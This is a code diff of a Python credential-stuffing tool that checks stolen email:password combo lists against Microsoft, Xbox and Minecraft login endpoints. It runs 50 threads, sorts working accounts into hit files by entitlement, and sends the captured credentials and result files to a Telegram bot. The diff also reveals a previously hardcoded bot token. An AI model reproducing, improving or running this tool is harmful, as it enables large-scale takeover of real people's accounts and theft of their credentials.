@@ -1,3 +1,27 @@
+import subprocess
+import sys
+
+try:
+    import requests
+    import urllib3
+    import warnings
+    from colorama import Fore, Style, init
+    MODULES_INSTALLED = True
+except ImportError:
+    MODULES_INSTALLED = False
+
+if not MODULES_INSTALLED:
+    print("Installing required modules...")
+    modules = ["requests", "colorama", "urllib3"]
+    try:
+        subprocess.check_call([sys.executable, "-m", "pip", "install"] + modules,
+                              stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
+        print("✓ Modules installed! Please restart the script.\n")
+        import time; time.sleep(2); sys.exit(0)
+    except Exception as e:
+        print(f"Error: {e}\nInstall manually: pip install {' '.join(modules)}")
+        sys.exit(1)
+
 import re
 import time
 import threading
@@ -5,20 +29,15 @@ import concurrent.futures
 import os
 from datetime import datetime
 from urllib.parse import urlparse, parse_qs
-import requests
-import urllib3
-import warnings
-from colorama import Fore, Style, init
 
 init(autoreset=True)
 urllib3.disable_warnings()
 warnings.filterwarnings("ignore")
 
 # ══════════════════════════════════════════════
-WELCOME_VIDEO_URL = "https://t.me/r1iv_k/2"
+WELCOME_VIDEO_URL = "https://t.me/QuatrHuit/2"
 MY_SIGNATURE      = "@r1ivk"
-CHANNEL           = "https://t.me/r1iv_k"
-REQUIRED_CHANNEL  = "@r1iv_k"
+CHANNEL           = "@r1iv_k"
 
 SFTAG_URL = (
     "https://login.live.com/oauth20_authorize.srf"
@@ -32,19 +51,20 @@ MAX_RETRIES     = 3
 REQUEST_TIMEOUT = 10
 THREAD_COUNT    = 50
 
-BOT_TOKEN = "8896382526:AAFMror2dFQ1U0r6RRHrrya2PKuyuoTRtnw"
+BOT_TOKEN = ""
 CHAT_ID   = ""
 
 # ══════════════════════════════════════════════
 BANNER = f"""
-{Fore.CYAN} ██████╗██╗  ██╗███████╗ ██████╗██╗  ██╗███████╗██████╗  
+{Fore.CYAN} ██████╗██╗  ██╗███████╗ ██████╗██╗  ██╗███████╗██████╗ 
 {Fore.CYAN}██╔════╝██║  ██║██╔════╝██╔════╝██║ ██╔╝██╔════╝██╔══██╗
 {Fore.CYAN}██║     ███████║█████╗  ██║     █████╔╝ █████╗  ██████╔╝
-{Fore.CYAN}██║     ██╔══██║██╔══╝  ██║     ██╔-██╗ ██╔══╝  ██╔══██╗
+{Fore.CYAN}██║     ██╔══██║██╔══╝  ██║     ██╔═██╗ ██╔══╝  ██╔══██╗
 {Fore.CYAN}╚██████╗██║  ██║███████╗╚██████╗██║  ██╗███████╗██║  ██║
 {Fore.CYAN} ╚═════╝╚═╝  ╚═╝╚══════╝ ╚═════╝╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝
 {Fore.WHITE}{'─'*57}
 {Fore.YELLOW}  DEVELOPED BY : {Fore.MAGENTA}{MY_SIGNATURE}
+{Fore.YELLOW}  CHANNEL      : {Fore.MAGENTA}{CHANNEL}
 {Fore.YELLOW}  EXPIRES ON   : {Fore.RED}NEVER
 {Fore.WHITE}{'─'*57}{Style.RESET_ALL}
 """
@@ -89,11 +109,11 @@ def create_folders():
 folders = create_folders()
 
 FILE_MAP = {
-    "minecraft":  "Results/Minecraft/Minecraft-hits_by_@r1ivk.txt",
-    "gamepass":   "Results/GamePass/game_pass-hits_by_@r1ivk.txt",
-    "xbox":       "Results/Xbox/xbox-hits_by_@r1ivk.txt",
-    "not_linked": "Results/HitNotLinked/not_linked_by_@r1ivk.txt",
-    "twofa":      "Results/2FA/2fa_by_@r1ivk.txt",
+    "minecraft":  "Results/Minecraft/Minecraft-hits_by_r1ivk.txt",
+    "gamepass":   "Results/GamePass/game_pass-hits_by_r1ivk.txt",
+    "xbox":       "Results/Xbox/xbox-hits_by_r1ivk.txt",
+    "not_linked": "Results/HitNotLinked/not_linked_by_r1ivk.txt",
+    "twofa":      "Results/2FA/2fa_by_r1ivk.txt",
 }
 
 def save_hit(category, content):
@@ -113,15 +133,14 @@ class TelegramBot:
         self.chat_id  = chat_id
         self.base_url = f"https://api.telegram.org/bot{token}"
 
-    def check_subscription(self, user_id):
+    def check_sub(self, user_id):
         try:
-            url = f"{self.base_url}/getChatMember"
-            resp = requests.get(url, params={"chat_id": REQUIRED_CHANNEL, "user_id": user_id}, timeout=10)
-            if resp.status_code == 200:
-                data = resp.json()
+            res = requests.get(f"{self.base_url}/getChatMember", params={"chat_id": CHANNEL, "user_id": user_id}, timeout=10)
+            if res.status_code == 200:
+                data = res.json()
                 if data.get("ok"):
                     status = data["result"].get("status")
-                    if status in ["member", "administrator", "creator"]:
+                    if status in ["creator", "administrator", "member"]:
                         return True
         except:
             pass
@@ -171,12 +190,6 @@ class TelegramBot:
 bot: TelegramBot = None
 
 def tg_send_welcome():
-    if CHAT_ID and CHAT_ID.isdigit():
-        if not bot.check_subscription(int(CHAT_ID)):
-            print(f"  ✗ المستخدم غير مشترك في القناة الإجبارية {REQUIRED_CHANNEL}!")
-            bot.send_message(f"❌ عذراً، يجب عليك الاشتراك في قناة البوت أولاً لتتمكن من استخدامه:\n{CHANNEL}")
-            return False
-
     caption = (
         "🎮 <b>Xbox / Minecraft Checker</b>\n\n"
         "🔍 <b>About this tool:</b>\n"
@@ -187,7 +200,7 @@ def tg_send_welcome():
         "• Sends hits directly to Telegram\n\n"
         "⚡ <b>Proxyless | Multi-threaded | Full Capture</b>\n\n"
         f"📢 Channel: {CHANNEL}\n"
-        f"👤 Credits: {MY_SIGNATURE}"
+        f"👤 Owner: {MY_SIGNATURE}"
     )
     return bot.send_video(WELCOME_VIDEO_URL, caption)
 
@@ -224,7 +237,7 @@ def tg_send_hit(email, password, account_type,
         f"🏷 <b>Type:</b> {account_type}\n"
         f"🎫 <b>Subscriptions:</b> {subscriptions}\n"
         f"━━━━━━━━━━━━━━━━━━━━\n"
-        f"📢 {REQUIRED_CHANNEL} | 👤 {MY_SIGNATURE}"
+        f"📢 Channel: {CHANNEL} | 👤 Owner: {MY_SIGNATURE}"
     )
 
     if gamerpic and gamerpic != "N/A" and gamerpic.startswith("http"):
@@ -261,55 +274,66 @@ def tg_send_final():
         f"🔓 <b>Not Linked:</b> {stats.not_linked}\n"
         f"━━━━━━━━━━━━━━━━━━━━\n"
         f"⚡ <b>CPM:</b> {stats.get_cpm()}\n"
-        f"📢 {REQUIRED_CHANNEL} | 👤 {MY_SIGNATURE}"
+        f"📢 Channel: {CHANNEL} | 👤 Owner: {MY_SIGNATURE}"
     )
     bot.send_message(msg)
 
 def tg_send_files():
     for cat, path in FILE_MAP.items():
-        bot.send_document(path, f"📁 {os.path.basename(path)} | {MY_SIGNATURE}")
+        bot.send_document(path, f"📁 {os.path.basename(path)} | Owner: {MY_SIGNATURE}")
         time.sleep(0.5)
 
 # ══════════════════════════════════════════════
+# LIVE TABLE DISPLAY
 def print_table(total):
     os.system('cls' if os.name == 'nt' else 'clear')
     print(BANNER)
+
     W = 50
 
     def row(label, value, color=Fore.WHITE):
         val_str = str(value)
         pad = W - len(label) - len(val_str) - 4
-        print(f"│ {color}{label} │ {color}{val_str}{' '*pad}│")
+        print(f"{Fore.WHITE}│ {color}{label}{Fore.WHITE} │ {color}{val_str}{' '*pad}{Fore.WHITE}│{Style.RESET_ALL}")
 
     def separator():
-        print(f"├{'─'*W}┤")
+        print(f"{Fore.WHITE}├{'─'*W}┤{Style.RESET_ALL}")
 
-    print(f"┌{'─'*W}┐")
-    print(f"│ Status checking...{' '*(W-19)}│")
+    print(f"{Fore.WHITE}┌{'─'*W}┐{Style.RESET_ALL}")
+    print(f"{Fore.WHITE}│ {Fore.YELLOW}Status checking...{' '*(W-19)}{Fore.WHITE}│{Style.RESET_ALL}")
     separator()
+
     row(f"✓ True ", stats.hits,   Fore.GREEN)
     row(f"✗ Bad  ", stats.bad,    Fore.RED)
     row(f"🔒 2FA ", stats.twofa,  Fore.YELLOW)
     row(f"↺ Retry", stats.retries,Fore.MAGENTA)
+
     separator()
-    print(f"│ {'#'}{' '*(W-2)}│")
+    print(f"{Fore.WHITE}│ {Fore.CYAN}{'#'}{' '*(W-2)}{Fore.WHITE}│{Style.RESET_ALL}")
     separator()
+
     row(f"⛏  Minecraft  ", stats.minecraft,  Fore.GREEN)
     row(f"🎮  Game Pass  ", stats.gamepass,   Fore.CYAN)
-    row(f"🕹  Xbox       ", stats.xbox,       Fore.BLUE)
+    row(f"🕹  Xbox        ", stats.xbox,       Fore.BLUE)
     row(f"🔓  Not Linked ", stats.not_linked, Fore.YELLOW)
+
     separator()
+
     pct      = (stats.checked / total * 100) if total > 0 else 0
     prog_str = f"Progress: {pct:.1f}% | {stats.checked}/{total} | {stats.get_cpm()} CPM"
     pad      = W - len(prog_str) - 2
-    print(f"│ {prog_str}{' '*pad}│")
+    print(f"{Fore.WHITE}│ {Fore.CYAN}{prog_str}{' '*pad}{Fore.WHITE}│{Style.RESET_ALL}")
+
     separator()
+
     email_display = stats.current_email[:W-12] if len(stats.current_email) > W-12 else stats.current_email
     pad           = W - len(email_display) - 11
-    print(f"│ Checking: {email_display}{' '*pad}│")
-    print(f"└{'─'*W}┘")
+    print(f"{Fore.WHITE}│ {Fore.YELLOW}Checking: {Fore.WHITE}{email_display}{' '*pad}{Fore.WHITE}│{Style.RESET_ALL}")
+
+    print(f"{Fore.WHITE}└{'─'*W}┘{Style.RESET_ALL}")
 
 # ══════════════════════════════════════════════
+# AUTH FUNCTIONS
 def get_sftag(session, max_attempts=MAX_RETRIES):
     for attempt in range(max_attempts):
         try:
@@ -449,8 +473,8 @@ def check_entitlements(session, mc_token, max_attempts=MAX_RETRIES):
                 else:
                     others = []
                     if 'product_minecraft_bedrock' in text: others.append("Bedrock")
-                    if 'product_legends' in text:            others.append("Legends")
-                    if 'product_dungeons' in text:         others.append("Dungeons")
+                    if 'product_legends' in text:           others.append("Legends")
+                    if 'product_dungeons' in text:        others.append("Dungeons")
                     if others: return 'Xbox: ' + ', '.join(others), others
                     return None, []
             elif response.status_code == 429:
@@ -514,6 +538,8 @@ def get_xbox_profile(session, uhs, xsts_token, max_attempts=MAX_RETRIES):
         time.sleep(0.3)
     return {"gamertag": "N/A", "gamerpic": "", "tier": "N/A", "rep": "N/A"}
 
+# ══════════════════════════════════════════════
+# MAIN CHECK
 def check_account(combo):
     try:
         parts = combo.strip().split(':')
@@ -579,7 +605,7 @@ def check_account(combo):
                 f"Tier          : {tier}\n"
                 f"Reputation    : {rep}\n"
                 f"Type          : Xbox (Not Linked)\n"
-                f"By {MY_SIGNATURE}\n"
+                f"Owner         : {MY_SIGNATURE}\n"
                 f"{'='*50}"
             )
             save_hit("not_linked", capture)
@@ -591,8 +617,8 @@ def check_account(combo):
             return
 
         profile = get_profile(session, mc_token)
-        name    = profile.get('name', 'N/A')     if profile else "Not Set"
-        uuid    = profile.get('id', 'N/A')       if profile else "N/A"
+        name    = profile.get('name', 'N/A')       if profile else "Not Set"
+        uuid    = profile.get('id', 'N/A')         if profile else "N/A"
         capes   = ", ".join([c["alias"] for c in profile.get("capes", [])]) if profile else "None"
         if not capes: capes = "None"
 
@@ -609,7 +635,7 @@ def check_account(combo):
             f"Capes         : {capes}\n"
             f"Type          : {account_type}\n"
             f"Subscriptions : {subs_str}\n"
-            f"By {MY_SIGNATURE}\n"
+            f"Owner         : {MY_SIGNATURE}\n"
             f"{'='*50}"
         )
 
@@ -637,22 +663,17 @@ def check_account(combo):
 
 # ══════════════════════════════════════════════
 def main():
-    global CHAT_ID, bot
+    global BOT_TOKEN, CHAT_ID, bot
 
     print(BANNER)
 
-    # إذا كنت تستخدم Railway وتريد قراءة المعرف أو ملف الكومبو تلقائياً أو عبر المتغيرات البيئية:
-    CHAT_ID    = os.getenv("CHAT_ID", "").strip()
-    combo_file = os.getenv("COMBO_FILE", "combos.txt").strip()
-
-    if not CHAT_ID:
-        CHAT_ID = input(f"  Enter your Telegram ID  : ").strip()
-    if not combo_file:
-        combo_file = input(f"  Enter combo file path   : ").strip()
+    CHAT_ID   = input(f"{Fore.CYAN}  Enter your Telegram ID    : {Style.RESET_ALL}").strip()
+    BOT_TOKEN = input(f"{Fore.CYAN}  Enter your Bot Token      : {Style.RESET_ALL}").strip()
+    combo_file = input(f"{Fore.CYAN}  Enter combo file path     : {Style.RESET_ALL}").strip()
     print()
 
     if not os.path.exists(combo_file):
-        print(f"  ✗ File not found: {combo_file}")
+        print(f"{Fore.RED}  ✗ File not found: {combo_file}{Style.RESET_ALL}")
         return
 
     with open(combo_file, 'r', encoding='utf-8', errors='ignore') as f:
@@ -660,21 +681,31 @@ def main():
 
     total = len(combos)
     if total == 0:
-        print(f"  ✗ No valid combos found!")
+        print(f"{Fore.RED}  ✗ No valid combos found!{Style.RESET_ALL}")
         return
 
     bot = TelegramBot(BOT_TOKEN, CHAT_ID)
 
-    print(f"  ✓ Loaded {total} combos")
-    print(f"  ✓ Threads : {THREAD_COUNT}")
-    print(f"  ✓ Results → ./Results/\n")
-
-    print(f"  → Verifying Telegram subscription and sending welcome video...")
-    if tg_send_welcome():
-        print(f"  ✓ Welcome video sent successfully!\n")
-    else:
-        print(f"  ✗ Operation stopped: The user must be subscribed to {REQUIRED_CHANNEL} to use the tool.\n")
+    # التحقق من الاشتراك الإجباري في القناة
+    print(f"{Fore.YELLOW}  → Checking subscription in channel {CHANNEL}...{Style.RESET_ALL}")
+    if not bot.check_sub(CHAT_ID):
+        print(f"\n{Fore.RED}  ❌ Error: You must join the channel {CHANNEL} to use this tool!{Style.RESET_ALL}")
+        print(f"{Fore.YELLOW}  → Please join {CHANNEL} and restart the script.{Style.RESET_ALL}")
         return
+    else:
+        print(f"{Fore.GREEN}  ✓ Channel subscription verified!{Style.RESET_ALL}")
+
+    print(f"{Fore.GREEN}  ✓ Loaded {total} combos{Style.RESET_ALL}")
+    print(f"{Fore.CYAN}  ✓ Threads : {THREAD_COUNT}{Style.RESET_ALL}")
+    print(f"{Fore.CYAN}  ✓ Results → ./Results/{Style.RESET_ALL}\n")
+
+    print(f"{Fore.YELLOW}  → Sending welcome video to Telegram...{Style.RESET_ALL}")
+    if tg_send_welcome():
+        print(f"{Fore.GREEN}  ✓ Welcome video sent!{Style.RESET_ALL}\n")
+    else:
+        print(f"{Fore.YELLOW}  ⚠ Could not send video{Style.RESET_ALL}\n")
+
+    input(f"{Fore.GREEN}  Press ENTER to start checking...{Style.RESET_ALL}")
 
     stop_event = threading.Event()
     def display_loop():
@@ -694,19 +725,19 @@ def main():
     disp.join(timeout=1)
 
     print_table(total)
-    print(f"\n  ✓ Checking complete!\n")
+    print(f"\n{Fore.GREEN}  ✓ Checking complete!{Style.RESET_ALL}\n")
 
-    print(f"  → Sending final stats...")
+    print(f"{Fore.YELLOW}  → Sending final stats...{Style.RESET_ALL}")
     tg_send_final()
 
-    print(f"  → Sending result files...")
+    print(f"{Fore.YELLOW}  → Sending result files...{Style.RESET_ALL}")
     tg_send_files()
-    print(f"  ✓ Done! Check your Telegram.\n")
+    print(f"{Fore.GREEN}  ✓ Done! Check your Telegram.{Style.RESET_ALL}\n")
 
 if __name__ == "__main__":
     try:
         main()
     except KeyboardInterrupt:
-        print(f"\n  ✗ Stopped by user")
+        print(f"\n{Fore.RED}  ✗ Stopped by user{Style.RESET_ALL}")
     except Exception as e:
-        print(f"\n  ✗ Fatal error: {e}")
+        print(f"\n{Fore.RED}  ✗ Fatal error: {e}{Style.RESET_ALL}")
